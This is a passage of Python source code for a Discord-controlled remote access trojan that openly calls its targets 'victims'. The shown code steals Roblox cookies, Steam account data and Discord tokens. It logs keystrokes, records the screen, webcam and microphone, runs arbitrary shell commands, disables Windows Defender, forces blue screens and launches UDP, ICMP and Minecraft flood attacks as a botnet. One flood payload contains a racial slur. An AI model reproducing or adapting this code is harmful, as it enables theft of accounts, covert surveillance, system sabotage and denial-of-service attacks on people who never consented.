            return f"Error fetching game name from Steam API: {response.status_code}"
    except Exception as e:
        return f"Error fetching game name from Steam API: {e}"

def extract_steam_account_data():
    if not os.path.exists(acc_vdf):
        return None

    account_data = {}
    with open(acc_vdf, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

        pattern = re.compile(r'"(\d+)"\s*\{\s*"AccountName"\s*"([^"]+)"\s*"PersonaName"\s*"([^"]+)"')
        matches = pattern.findall(content)

        for steam_id, account_name, persona_name in matches:
            account_data[steam_id] = {
                "AccountName": account_name,
                "PersonaName": persona_name
            }

    return account_data

def extract_steam_games():
    if not os.path.exists(apps_vdf):
        return None

    games_data = {}
    with open(apps_vdf, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

        pattern = re.compile(r'"(\d+)"\s*"([^"]+)"')
        matches = pattern.findall(content)

        for game_id_str, game_name in matches:
            game_id = int(game_id_str)
            game_name_from_api = get_game_name_from_api(game_id)
            if game_name_from_api:
                games_data[game_id] = game_name_from_api
            else:
                games_data[game_id] = game_name

    return games_data

# https://github.com/Ramona-Flower/Roblox-Client-Cookie-Stealer/tree/main
def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        return
    
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    with open(destination_path, 'r', encoding='utf-8') as file:
        try:
            file_content = json.load(file)
            
            encoded_cookies = file_content.get("CookiesData", "")
            
            if encoded_cookies:
                decoded_cookies = base64.b64decode(encoded_cookies)
            try:
                decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')

                with open("decrypted_cookies.txt", "w", encoding='utf-8') as f:
                    f.write(decrypted_text)

                return "decrypted_cookies.txt"
            except Exception as e:
                print(f"Error decrypting with DPAPI: {e}")
                return None
            else:
                print("Error: No 'CookiesData' found in the file.")
        
        except json.JSONDecodeError as e:
            print(f"Error while parsing JSON: {e}")
        except Exception as e:
            print(f"Error: {e}")
            
ddosexec = ThreadPoolExecutor(max_workers=3)
def udp_flood(ip, duration):
    port = 80
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = b'\x00' * 65507
    end = time.time() + duration
    while time.time() < end:
        sock.sendto(packet, (ip, port))
    sock.close()

def minecraft_flood(ip, duration):
    port = 25565
    end = time.time() + duration
    while time.time() < end:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((ip, port))
            sock.send(b'\x00' * 65500)
            sock.close()
        except Exception:
            pass

def pod_flood(ip, duration):
    duration = int(duration)
    end_time = time.time() + duration
    MESSAGE = b"T" * 60000

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        source_ip = s.getsockname()[0]
        s.close()
    except:
        source_ip = "0.0.0.0"

    packet = IP(src=source_ip, dst=ip) / ICMP() / MESSAGE

    while time.time() < end_time:
        send(packet, verbose=False)

def hzzh_flood(ip, duration):
    end = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = b'NIGGAHOLYNIGGAS' * 3000
    while time.time() < end:
        sock.sendto(packet, (ip, 80))
    sock.close()

@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="[H-zz-H] !help 📚",
        description="Here is !help 🤖",
        color=0x00ff00
    )
    embed.add_field(name="!information", value="Sends your system information 🖥️", inline=False)
    embed.add_field(name="!disk", value="Sends used disk space 📦", inline=False)
    embed.add_field(name="!cpu", value="Shows current CPU usage ⚙️", inline=False)
    embed.add_field(name="!ram", value="Shows current RAM usage 💾", inline=False)
    embed.add_field(name="!overview", value="Shows all information for CPU, RAM, and Disk 🛠️", inline=False)
    embed.add_field(name="!network", value="Lists all WiFi networks with passwords 🌐", inline=False)
    embed.add_field(name="!net_pass (Wifi name)", value="Outputs the password of the Wifi selected 🌐", inline=False)
    embed.add_field(name="!publicip", value="Get Public IP of Victim 🌐", inline=False)
    embed.add_field(name="!battery", value="Shows battery status (if laptop) 🔋", inline=False)
    embed.add_field(name="!webcam", value="Shows webcam image 📸", inline=False)
    embed.add_field(name="!screen", value="Takes a Screenshot 🖼️", inline=False)
    embed.add_field(name="!tasks", value="Shows current running tasks 📝", inline=False)
    embed.add_field(name="!web_open (url)", value="Opens a URL in the browser 🌍", inline=False)
    embed.add_field(name="!fakecmd (amount)", value="Quick flashes (amount) CMD's 💻", inline=False)
    embed.add_field(name="!cmdspam", value="Quickly spams CMD's until System crashes 💻", inline=False)
    embed.add_field(name="!command (command)", value="Executes the given Command 💻", inline=False)
    embed.add_field(name="!shell (command)", value="Executes the given Command (in powershell) 💻", inline=False)
    embed.add_field(name="!taskkill", value="Find programs with !tasks 🕳", inline=False)
    # embed.add_field(name="!running", value="On how many PC's is it running rn 🌍", inline=False)
    embed.add_field(name="!botnet (ip) (time) <method>", value="Start a DDOS attack on a specific Server ⚡", inline=False)
    embed.add_field(name="!error (Title) | (Text)", value="Displays a fake error Message ⚠️", inline=False)
    embed.add_field(name="!shutdown", value="Shutdowns Victims PC 🛑", inline=False)
    embed.add_field(name="!restart", value="Restarts Victims PC 🔄", inline=False)
    embed.add_field(name="!cd (path)", value="CD into another directory 🛠️", inline=False)
    embed.add_field(name="!list", value="Lists all files in current directory 📂", inline=False)
    embed.add_field(name="!roblox", value="Steal roblox cookie 🎮🕹", inline=False)
    await ctx.send(embed=embed)

    embed1 = discord.Embed(
        color=0x00ff00
    )
    embed1.add_field(name="!download (file/path)", value="Download a file from Victims PC (10MB)📥", inline=False)
    embed1.add_field(name="!download_ext (file.png)", value="Download a file from Victims PC (100MB)📥", inline=False)
    embed1.add_field(name="!upload (attachment) (!path!)", value="Upload a file to Victims PC (10MB)📤", inline=False)
    embed1.add_field(name="!upload_ext (URL) (!path!)", value="Upload a file to Victims PC (Unlimited MB)📤", inline=False)
    embed1.add_field(name="!startup", value="Puts H-zz-H in Startups using 5 different unknown Methods 🐀", inline=False)
    embed1.add_field(name="!admin", value="Checks for admin Permissions 🛠️", inline=False)
    embed1.add_field(name="!wallpaper (attachment.png)", value="Change wallpaper of Victim 🖼️", inline=False)
    embed1.add_field(name="!clipboard", value="Show Clipboard of the Victim 📋", inline=False)
    embed1.add_field(name="!exec (path)", value="Executes a file ", inline=False)
    embed1.add_field(name="!closesession", value="Closes if existing 2nd/3rd Sessions of the Same PC 💻", inline=False)
    embed1.add_field(name="!keylog_start", value="Starts capturing keystrokes ⌨", inline=False)
    embed1.add_field(name="!keylog_dump", value="Sends the recorded keystrokes (first need to stop keylogger) ⌨", inline=False)
    embed1.add_field(name="!keylog_stop", value="Stops capturing keystrokes ⌨", inline=False)
    embed1.add_field(name="!encrypt (*) or (file.extension)", value="Changes (all) Files in directory to .hzzh ⚽", inline=False)
    embed1.add_field(name="!recscreen (sec)", value="Records the screen for a specific number of seconds 🖼️📷", inline=False)
    embed1.add_field(name="!recaudio (sec)", value="Records audio for a specific number of seconds 🎤📷", inline=False)
    embed1.add_field(name="!recwebcam (sec)", value="Records webcam for a specific number of seconds 📷📷", inline=False)
    embed1.add_field(name="!hwid", value="Get HWID of the PC 🍕🍕", inline=False)
    embed1.add_field(name="!minimize", value="Simulating win + D press. (Showing Desktop)🖼👩‍💻", inline=False)
    embed1.add_field(name="!cleartaskbar", value="Clears all icons on the Taskbar ❌👌", inline=False)
    embed1.add_field(name="!playmp3", value="Plays an attached mp3 file. 🎵🎶", inline=False)
    embed1.add_field(name="!closeexplorer", value="Closes Explorer (removes taskbar and Desktop) 🤯", inline=False)
    embed1.add_field(name="!selfdestruct", value="Removes the RAT and all traces! 💣", inline=False)
    embed1.add_field(name="!steam", value="Gets Steam Account Info and Apps installed. 🍕", inline=False)
    embed1.add_field(name="!tokens", value="Get Discord Tokens 🎁", inline=False)
    # embed1.add_field(name="!browser", value="Get Browser Passwords & more! 🦕🦕", inline=False) Not added rn bc i tried adding for over 6-8 hours or smth and i cant get it to work ;(

    await ctx.send(embed=embed1)

    embed2 = discord.Embed(
        color=0x00ff00 
    )
    embed1.add_field(name="!getadmin", value="Gets admin Permissions by spamming UAC prompts 🛠️", inline=False)
    embed1.add_field(name="", value="", inline=False)
    embed1.add_field(name="", value="**Admin required Features:**", inline=False)
    embed1.add_field(name="!taskmgr", value="Disables Task Manager 🎰", inline=False)
    embed1.add_field(name="!taskmgr_enable", value="Enables Task Manager 🎰", inline=False)
    embed2.add_field(name="!blocklist", value="Disables the Victim to lookup common AV Sites 🦠", inline=False)
    embed2.add_field(name="!unblocklist", value="Enables the Victim to lookup common AV Sites 🦠", inline=False)
    embed2.add_field(name="!nostartup", value="Disable Users permissions to look in the Startup Folder 🔒🗂️", inline=False)
    embed2.add_field(name="!nostartup_disable", value="Enables Users permissions to look in the Startup Folder 🔓🗂️", inline=False)
    embed2.add_field(name="!critproc", value="Makes H-zz-H a critical process. Close = Bluescreen 🆙", inline=False)
    embed2.add_field(name="!uncritproc", value="Removes the critical process. 🆙", inline=False)
    embed2.add_field(name="!smartup", value="Uses an Unknown StartUp path. 🐀", inline=False)
    embed2.add_field(name="!windef", value="Disables Windows Defender. 🛡", inline=False)
    embed2.add_field(name="!block", value="Blocks/Unblocks the inputs. 🖱️❌⌨️", inline=False)
    embed2.add_field(name="!exclude_exe", value="Hide RAT by excluding all .exe files in Windows Defender. 🐀", inline=False)
    embed2.add_field(name="", value="", inline=False)
    embed2.add_field(name="", value="**Troll Features:**", inline=False)
    embed2.add_field(name="!floatpic (seconds) (url)", value="Creates an floating unclosable image for (seconds)", inline=False)
    embed2.add_field(name="!screensaver", value="Shows an auto installed screensaver", inline=False)
    embed2.add_field(name="!logout", value="Logs out of current user (like win+L)", inline=False)
    embed2.add_field(name="!reverse", value="Reverses the mouse movement! 🖱️🔄", inline=False)
    embed2.add_field(name="!jumpscare", value="loud, scary jumpscare😱🔊", inline=False)
    embed2.add_field(name="!cpufuck", value="Maxes out the CPU usage to 100% ⚡💻", inline=False)
    embed2.add_field(name="!bluescreen", value="Crashes the PC with a BSOD. 💥🖥️", inline=False)

    await ctx.send(embed=embed2)

    embed3 = discord.Embed(
    color=0x00ff00 
    )
    embed3.add_field(name="!shaking", value="Makes the mouse shake automaticly 🖱️💥", inline=False)
    embed3.add_field(name="", value="", inline=False)
    embed3.add_field(name="", value="**Discord Features:**", inline=False)
    embed3.add_field(name="!purge (amount)", value="Purges (amount) Chat Messages in Chat 🚮", inline=False)
    embed3.add_field(name="!recreate (#channel)", value="Deletes and recreates a Channel 🔄", inline=False)
    embed3.add_field(name="!net", value="Creates / Recreates the Botnet Channel ⚡", inline=False)
    embed3.add_field(name="", value="Made with ❤ by H-zz-H.", inline=False)

    await ctx.send(embed=embed3)

cmdusage = (
    "**Usage:** `!botnet <ip> <time_in_seconds> <method>`\n\n"
    "**Methods:**\n"
    "- `udp` (port 80) — for normal websites (Recommended)\n"
    "- `pod` (port 80) — Ping of Death (99% Outdated))\n"
    "- `hzzh` (port 80) — selfmade method (Not really added rn)\n"
    "- `minecraft` (port 25565) — Minecraft server (Should work for minecraft Servers!)\n")

@bot.command()
async def botnet(ctx, ip: str = None, time_sec: str = None, method: str = None):
    if not ip or not time_sec or not method:
        await ctx.send(f"❌ Missing arguments!\n\n{cmdusage}")
        return

    method = method.lower()
    if method not in methods:
        await ctx.send(f"❌ Invalid method `{method}`!\n\n{cmdusage}")
        return

    if not time_sec.isdigit() or int(time_sec) <= 0:
        await ctx.send(f"❌ Time must be a positive number!\n\n{cmdusage}")
        return

    time_sec = int(time_sec)

    embed = discord.Embed(
        title="💥 Botnet Attack Started!",
        description=f"Launching Method: **{method}** on `{ip}` for `{time_sec}` seconds...",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

    loop = asyncio.get_event_loop()

    if method == "udp":
        await loop.run_in_executor(ddosexec, udp_flood, ip, time_sec)
    elif method == "minecraft":
        await loop.run_in_executor(ddosexec, minecraft_flood, ip, time_sec)
    elif method == "pod":
        await loop.run_in_executor(ddosexec, pod_flood, ip, time_sec)
    elif method == "hzzh":
        await loop.run_in_executor(ddosexec, hzzh_flood, ip, time_sec)

@bot.command()
async def roblox(ctx):
    try:
        file_path = retrieve_roblox_cookies()
        
        if file_path:
            with open(file_path, "rb") as f:
                await ctx.send(
                    content="🦺 Roblox Cookies has been retrieved successfully.",
                    file=discord.File(f, filename="decrypted_cookies.txt")
                )
        else:
            raise Exception("Failed to decrypt or save cookies.")
    except Exception as e:
        embed = discord.Embed(
            title="❌ Failed to retrieve Roblox cookies",
            description=f"Error occurred: `{e}`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command()
async def minimize(ctx):
    try:
        pyautogui.hotkey('win', 'd')

        embed = discord.Embed(
            title="🖥️ Pressed win + D",
            description="Successfully simulated win + D.",
            color=discord.Color.green()
        )
    except Exception as e:
        embed = discord.Embed(
            title="❌ Failed to press win + D",
            description=f"Error occurred: `{e}`",
            color=discord.Color.red()
        )

    await ctx.send(embed=embed)

@bot.command()
async def cleartaskbar(ctx):
    try:
        taskbar_path = os.path.expandvars(r"%AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar")

        if not os.path.exists(taskbar_path):
            embed = discord.Embed(
                title="❌ Taskbar Path Not Found",
                description="Could not find the taskbar path.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return

        for filename in os.listdir(taskbar_path):
            file_path = os.path.join(taskbar_path, filename)
            try:
                if os.path.isfile(file_path):
                    os.remove(file_path)
            except Exception as e:
                print(f"Failed to delete {file_path}. Reason: {e}")

        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], check=True)
        subprocess.Popen("explorer.exe")

        embed = discord.Embed(
            title="🗑️ Taskbar Cleared",
            description="All pinned apps have been removed from the taskbar.",
            color=discord.Color.green()
        )
    except Exception as e:
        embed = discord.Embed(
            title="❌ Failed to Clear Taskbar",
            description=f"Error: `{e}`",
            color=discord.Color.red()
        )

    await ctx.send(embed=embed)

@bot.command()
async def playmp3(ctx):
    try:
        if not ctx.message.attachments:
            embed = discord.Embed(
                title="❌ No MP3 Attachments Found",
                description="Please attach MP3 files when using this command.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        
        downloaded_files = []

        for attachment in ctx.message.attachments:
            if attachment.filename.lower().endswith(".mp3"):
                file_path = os.path.join(temp_folder, attachment.filename)
                await attachment.save(file_path)
                downloaded_files.append(file_path)

        if not downloaded_files:
            embed = discord.Embed(
                title="❌ No MP3 Files",
                description="No valid MP3 files found in your attachments.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return

        chosen_file = random.choice(downloaded_files)

        os.startfile(chosen_file)

        embed = discord.Embed(
            title="🎶 Playing Random MP3",
            description=f"Now playing: `{os.path.basename(chosen_file)}`",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error Playing MP3",
            description=f"Error: `{e}`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command()
async def closeexplorer(ctx):
    try:
        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], check=True)

        embed = discord.Embed(
            title="🗿 Explorer Closed",
            description="`explorer.exe` has been terminated. Taskbar and desktop are gone!",
            color=discord.Color.dark_red()
        )
    except Exception as e:
        embed = discord.Embed(
            title="❌ Failed to Close Explorer",
            description=f"Error occurred: `{e}`",
            color=discord.Color.red()
        )

    await ctx.send(embed=embed)

@bot.command()
async def selfdestruct(ctx):
    try:
        embed = discord.Embed(
            title="💣 Self-Destruct Activated",
            description="Bot is shutting down and removing files...",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

        await bot.close()

        if os.path.exists(hzzh_path):
            os.remove(hzzh_path)

        if os.path.exists(hzzh_path1):
            os.remove(hzzh_path1)

        try:
            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            reg.DeleteValue(registry_key, "Windows Defender")
            reg.CloseKey(registry_key)
        except Exception as e:
            pass

        os.remove(script_path)

    except Exception as e:
        print(f"Self-destruct failed: {e}")
    finally:
        sys.exit(0)

@bot.command()
async def hwid(ctx):
    try:
        result = subprocess.check_output('reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid', shell=True, text=True)
        hwid = result.split("REG_SZ")[-1].strip()

        embed = discord.Embed(
            title="🖥️ Victims HWID",
            description=f"`{hwid}`",
            color=discord.Color.blurple()
        )

    except Exception as e:
        embed = discord.Embed(
            title="❌ Failed to Fetch HWID",
            description=f"Error occurred: `{e}`",
            color=discord.Color.red()
        )

    await ctx.send(embed=embed)

@bot.command()
async def steam(ctx):
    try:
        account_data = extract_steam_account_data()
        games_data = extract_steam_games()

        if account_data and games_data:
            for steam_id, data in account_data.items():
                embed = discord.Embed(
                    title=f"Account Name: \n{data['AccountName']}",
                    description=f"**Personal Name** \n{data['PersonaName']}",
                    color=discord.Color.green()
                )
                
                embed.add_field(name="Steam ID", value=steam_id, inline=False)
                
                game_list = "\n".join(
                    [f"Game Name: {game_name}" for game_id, game_name in games_data.items()
                     if game_id not in [1106853685130127918, 0, 2148357644, 1744723744]]
                )
                
                if game_list:
                    embed.add_field(name="Installed Steam Games", value=game_list, inline=False)
                else:
                    embed.add_field(name="Installed Steam Games", value="No valid games found.", inline=False)

                await ctx.send(embed=embed)

        else:
            embed = discord.Embed(
                title="❌ No Steam Data Found",
                description="Could not fetch Steam account or games data.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Failed to Fetch Steam Data",
            description=f"Error occurred: `{e}`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command()
async def exclude_exe(ctx):
    if is_admin():
        try:
            ps_command = "Add-MpPreference -ExclusionExtension '.exe'"
            subprocess.run(["powershell", "-Command", ps_command], check=True)

            embed = discord.Embed(
                title="✅ .exe Exclusion Added",
                description="Successfully added the .exe exclusion to Windows Defender.",
                color=discord.Color.green()
            )
        except Exception as e:
            embed = discord.Embed(
                title="❌ Failed to Add Exclusion",
                description=f"Error occurred: `{e}`",
                color=discord.Color.red()
            )
    else:
        embed = discord.Embed(
            title="❌ Admin Privileges Required!",
            description="This script isn't running with Admin! Use `!getadmin` to get Admin!",
            color=discord.Color.red()
        )

    await ctx.send(embed=embed)

@bot.command()
async def upload_ext(ctx, path: str = None):
    try:
        if not path or urlparse(path).scheme not in ['http', 'https']:
            embed = discord.Embed(
                title="⚠️ Invalid or Missing URL",
                description="Please provide a valid file URL. Example:\n`!upload https://example.com/file.exe`",
                color=0xFFAA00
            )
            await ctx.send(embed=embed)
            return

        filename = os.path.basename(urlparse(path).path)
        file_path = os.path.join(temp_folder, filename)

        response = requests.get(path)
        if response.status_code != 200:
            raise Exception(f"Failed to download file. HTTP status: {response.status_code}")
        
        with open(file_path, 'wb') as f:
            f.write(response.content)

        embed = discord.Embed(
            title="✅ File Downloaded",
            description=f"File `{filename}` has been downloaded to `{file_path}`.",
            color=0x00FF00
        )
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error",
            description=f"An error occurred: `{str(e)}`",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

shaking_enabled = False
shaking_task = None
@bot.command()
async def shaking(ctx):
    global shaking_enabled, shaking_task

    if not shaking_enabled:
        shaking_enabled = True

        async def shake_mouse():
            while shaking_enabled:
                x, y = pyautogui.position()
                pyautogui.moveTo(x + 10, y + 10, duration=0.05)
                pyautogui.moveTo(x - 10, y - 10, duration=0.05)
                await asyncio.sleep(0.05)

        shaking_task = asyncio.create_task(shake_mouse())

        embed = discord.Embed(
            title="🖱️ Mouse Shaking Activated",
            description="The mouse is now shaking randomly.",
            color=0x00ff00
        )
    else:
        shaking_enabled = False
        if shaking_task:
            shaking_task.cancel()
            shaking_task = None

        embed = discord.Embed(
            title="🛑 Mouse Shaking Stopped",
            description="Mouse movement has returned to normal.",
            color=0xff0000
        )

    await ctx.send(embed=embed)

@bot.command()
async def bluescreen(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        
        embed = discord.Embed(
            title="💥 BSOD Triggered",
            description="A real BSOD has been triggered.",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = discord.Embed(
            title="⚠️ Error",
            description=f"Failed to trigger BSOD. Error: {e}",
            color=0xff0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def cpufuck(ctx):
    global cpu_stress_running
    
    if cpu_stress_running:
        cpu_stress_running = False
        embed = discord.Embed(
            title="🔴 CPU Fucker Stopped",
            description="Stopped.",
            color=0x00ff00
        )
        await ctx.send(embed=embed)
    else:
        cpu_stress_running = True
        threading.Thread(target=cpu_stress).start()
        
        embed = discord.Embed(
            title="⚡ CPU Fucker Started",
            description="Going to 100%!",
            color=0xff0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def jumpscare(ctx):
    try:
        embed = discord.Embed(
            title="⚠️ Jumpscare Warning!",
            description="A fullscreen jumpscare is about to appear! 😱🔊",
            color=0xff0000
        )
        await ctx.send(embed=embed)

        jumpscaaare()

        embed = discord.Embed(
            title="💥 Jumpscare Triggered!",
            description="The jumpscare website has been opened in fullscreen! LOUD SOUND ALERT! 😱",
            color=0xff0000
        )
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="⚠️ Error",
            description=f"An error occurred while triggering the jumpscare: {e}",
            color=0xff0000
        )
        await ctx.send(embed=embed)

@bot.command()
async def reverse(ctx):
    global reverse_mouse
    
    if reverse_mouse:
        reverse_mouse = False
        embed = discord.Embed(
            title="🖱️ Mouse Movement Reversed",
            description="Mouse movement reversal has been stopped! 🔄",
            color=0x00ff00
        )
        await ctx.send(embed=embed)
    else:
        reverse_mouse = True
        threading.Thread(target=reverse_mouse_move, daemon=True).start()
        
        embed = discord.Embed(
            title="🖱️ Mouse Movement Reversed",
            description="Mouse movement will now be reversed! 🔄",
            color=0x00ff00
        )
        await ctx.send(embed=embed)

@bot.command()
async def logout(ctx):
    try:
        ctypes.windll.user32.LockWorkStation()

        embed = discord.Embed(
            title="🔒 Logging Out",
            description="You have been logged out successfully (like pressing Win+L).",
            color=0x00ff00
        )
        
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="⚠️ Error",
            description=f"Failed to log out. Error: {e}",
            color=0xff0000
        )
        
        await ctx.send(embed=embed)

input_blocked = False
@bot.command()
async def block(ctx):
    global input_blocked

    if is_admin():
        try:
            if input_blocked:
                unblock_inputs()
                input_blocked = False
                embed = discord.Embed(
                    title="✅ Mouse & Keyboard Unblocked",
                    description="Successfully unblocked the mouse and keyboard input. 🖱️⌨️",
                    color=discord.Color.green()
                )
            else:
                block_inputs()
                input_blocked = True
                embed = discord.Embed(
                    title="✅ Mouse & Keyboard Blocked",
                    description="Successfully blocked the mouse and keyboard input. 🖱️❌⌨️",
                    color=discord.Color.green()
                )
        except Exception as e:
            embed = discord.Embed(
                title="❌ Failed to Block/Unblock!",
                description=f"Error occurred: `{e}`",
                color=discord.Color.red()
            )
    else:
        embed = discord.Embed(
            title="❌ Admin Privileges Required!",
            description="This script isn't running with Admin! Use `!getadmin` to get Admin!",
            color=discord.Color.red()
        )

    await ctx.send(embed=embed)

@bot.command()
async def windef(ctx, process: str = "disable"):
    if is_admin():
        try:
            await windowsdefender_disable()
            embed = discord.Embed(
                title="✅ Success on Disabling!",
                description="Successfully disabled Windows Defender! (May need restart!) 🛡",
                color=discord.Color.green()
            )
        except Exception as e:
            embed = discord.Embed(
                title="❌ Failed to disable!",
                description=f"Error occurred: `{e}`",
                color=discord.Color.red()
            )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="❌ Failed to disable Windows Defender!",
            description="This script isn't running with Admin! Use `!getadmin` to get Admin!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command()
async def taskkill(ctx, process: str):
    try:
        found = False
        for proc in psutil.process_iter(['pid', 'name']):
            if process.lower() in proc.info['name'].lower():
                proc_instance = psutil.Process(proc.info['pid'])
                proc_instance.terminate() 
                found = True

        if found:
            embed = discord.Embed(
                title="🛑 Process Terminated",
                description=f"Successfully attempted to kill all instances of `{process}`.",
                color=0x00ff00
            )
        else:
            embed = discord.Embed(
                title="❌ Process Not Found",
                description=f"No running process found named: `{process}`.",
                color=0xff0000
            )

        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="⚠️ Error",
            description=f"An error occurred: `{str(e)}`",
            color=0xffa500
        )
        await ctx.send(embed=embed)

@bot.command()
async def recscreen(ctx, duration: int):
    await ctx.send(f"Recording screen for {duration} seconds...")
    video_file = record_screen(duration)
    await send_file(ctx, video_file)

@bot.command()
async def recaudio(ctx, duration: int):
    await ctx.send(f"Recording audio for {duration} seconds...")
    audio_file = record_audio(duration)
    await send_file(ctx, audio_file)

@bot.command()
async def recwebcam(ctx, duration: int):
    await ctx.send(f"Recording webcam for {duration} seconds...")
    webcam_file = record_webcam(duration)
    await send_file(ctx, webcam_file)

@bot.command()
async def shell(ctx, *, cmd: str):
    try:
        process = subprocess.Popen(
            ["powershell.exe", "-Command", cmd], 
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        stdout, stderr = process.communicate()

        if process.returncode == 0:
            output = stdout
        else:
            output = stderr

        if len(output) > 2000:
            temp_file_path = os.path.join(temp_folder, "command_output.txt")

            with open(temp_file_path, "w", encoding="utf-8") as f:
                f.write(output)

            await ctx.send(
                content="The output was too long, so it has been saved to a file. You can download it below:",
                file=discord.File(temp_file_path)
            )
        else:
            embed = discord.Embed(
                title="💻 Command Output",
                description=f"Executed command: `{cmd}`",
                color=0x00ff00
            )
            embed.add_field(name="Output", value=output, inline=False)
            await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Command Error",
            description=f"An error occurred while executing the command: {str(e)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)

def write_to_file(keys):
    with open(log_file_path, 'a') as file:
        for key in keys:
            file.write(f"{key}\n")

def on_press(key):
    key_log.append(str(key))

@bot.command()
async def keylog_start(ctx):
    global keylog_listener, key_log

    key_log = []
    if os.path.exists(log_file_path):
        os.remove(log_file_path)
    
    if keylog_listener is None:
        keylog_listener = keyboard.Listener(on_press=on_press)
        keylog_listener.start()
        embed = discord.Embed(
            title="⌨ Keylogging",
            description="Keylogger started and logging keystrokes.",
            color=0x00ff00
        )
        
        await ctx.send(embed=embed)

@bot.command()
async def keylog_stop(ctx):
    global keylog_listener

    if keylog_listener is not None:
        keylog_listener.stop()
        keylog_listener = None
        write_to_file(key_log)
        embed = discord.Embed(
            title="⌨ Keylogging",
            description="Keylogger stopped and data saved!",
            color=0x00ff00
        )
        
        await ctx.send(embed=embed)

@bot.command()
async def keylog_dump(ctx):
    if os.path.exists(log_file_path):
        await ctx.send(file=discord.File(log_file_path, "hzzh.txt"))
    else:
        embed = discord.Embed(
            title="⌨ Keylogging",
            description="No keylog data available. Start the keylogger first with `!keylog_start`",
            color=0x00ff00
        )
        
        await ctx.send(embed=embed)

@bot.command()
async def encrypt(ctx, *args):
    embed = discord.Embed(title="🔐 Encrypt Command", color=0x00ff00)

    if len(args) == 1 and args[0] == "*":
        encrypted_files = []
        for filename in os.listdir(current_directory):
            file_path = os.path.join(current_directory, filename)
            if os.path.isfile(file_path):
                name, ext = os.path.splitext(filename)
                if ext != ".hzzh":
                    new_name = name + ".hzzh"
                    new_path = os.path.join(current_directory, new_name)
                    os.rename(file_path, new_path)
                    encrypted_files.append(f"{filename} ➔ {new_name}")
        
        if encrypted_files:
            embed.description = f"Encrypted the following files:\n" + "\n".join(encrypted_files)
        else:
            embed.description = "No files were encrypted (all were already in .hzzh format)."
    elif len(args) == 1:
        file_name = args[0]
        file_path = os.path.join(current_directory, file_name)
        if os.path.isfile(file_path):
            name, ext = os.path.splitext(file_name)
            if ext != ".hzzh":
                new_name = name + ".hzzh"
                new_path = os.path.join(current_directory, new_name)
                os.rename(file_path, new_path)
                embed.description = f"Encrypted: {file_name} ➔ {new_name}"
            else:
                embed.title = "❌ Encrypt Command Error"
                embed.description = f"The file {file_name} is already encrypted."
                embed.color = 0xff0000
        else:
            embed.title = "❌ Encrypt Command Error"
            embed.description = f"File {file_name} not found in the current directory."
            embed.color = 0xff0000
    else:
        embed.title = "❌ Encrypt Command Error"
        embed.description = "Invalid argument! Use `!encrypt *` to encrypt all files or `!encrypt <file.extension>` to encrypt a specific file."
        embed.color = 0xff0000

    await ctx.send(embed=embed)

@bot.command()
async def tokens(ctx):
    embed = await tokenoutput(ctx)
    await ctx.send(embed=embed)

@bot.command()
async def screensaver(ctx):
    try:
        screensaver_path = r"C:\Windows\System32\Mystify.scr"
        
        subprocess.Popen([screensaver_path, '/s'])

        embed = discord.Embed(
            title="🖥️ Screensaver Activated",
            description="The Mystify screensaver has been successfully started!",
            color=0x00ff00
        )
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = discord.Embed(
            title="⚠️ Error",
            description=f"Failed to start the screensaver. Error: {e}",
            color=0xff0000
        )
        
